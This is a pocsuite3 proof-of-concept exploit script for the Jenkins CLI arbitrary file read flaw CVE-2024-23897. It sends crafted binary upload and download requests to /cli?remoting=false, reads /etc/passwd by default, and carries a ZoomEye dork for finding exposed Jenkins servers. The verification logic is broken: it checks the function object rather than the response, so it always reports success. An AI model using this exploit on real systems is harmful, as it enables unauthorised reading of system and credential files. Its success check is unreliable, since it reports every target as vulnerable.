from pocsuite3.api import POCBase, register_poc,Output,OrderedDict,OptString,logger
import http.client
import threading
import uuid
from queue import Queue
import urllib.parse

class POC(POCBase):
    name = 'Jenkins任意文件读取漏洞(CVE-2024-23897)'
    vulID = 'CVE-2024-23897'
    vulType = 'Arbitrary File Read'
    appVersion = 'Jenkins <= 2.441,Jenkins <= LTS 2.426.2'
    appName = 'Jenkins'
    dork = {'zoomeye': 'app:"Jenkins"'}

    def _options(self):
        o = OrderedDict()
        o["file_path"] = OptString('/etc/passwd',description="选择读取的文件了路径.",require=True)
        return o
    def _verify(self):
        uuid_str = str(uuid.uuid4())
        vul_url = "/cli?remoting=false"
        target_info = urllib.parse.urldefrag(self.url)
        def upload_data(target,file_path):
            try:
                data = b'\x00\x00\x00\x06\x00\x00\x04help\x00\x00\x00\x0e\x00\x00\x0c@' + file_path.encode() + b'\x00\x00\x00\x05\x02\x00\x03GBK\x00\x00\x00\x07\x01\x00\x05en_US\x00\x00\x00\x00\x03'
                conn = http.client.HTTPConnection(target.netloc)
                conn.request("POST","/cli?remoting=false",headers={
                "Session": uuid_str,
                "Side": "upload",
                "Content-type": "application/octet-stream"
            }, body=data)
            except Exception as e:
                    Output.error("[-]请求失败")

        def download_data(target):
            try:
                conn = http.client.HTTPConnection(target.netloc)
                conn.request("POST","/cli?remoting=false",headers={
                    "Session": uuid_str,
                    "Side": "download"
                })
                req = conn.getresponse().read()
                if b"root:x:0:0:root" in req:
                    return req
            except Exception as e:
                pass
        def launch_exploit(target, file_path):

            upload_thread = threading.Thread(target=upload_data, args=(target, file_path,))
            download_thread = threading.Thread(target=download_data, args=(target,))

            upload_thread.start()
            download_thread.start()

            upload_thread.join()
            download_thread.join()


        target_info = urllib.parse.urlparse(self.url)
        launch_exploit(target_info,self.get_option("file_path"))
        result = {}
        if download_data:
            result['Verify'] = {}
            result['Verify']['URL'] =self.url
            return self.parse_output(result)

register_poc(POC)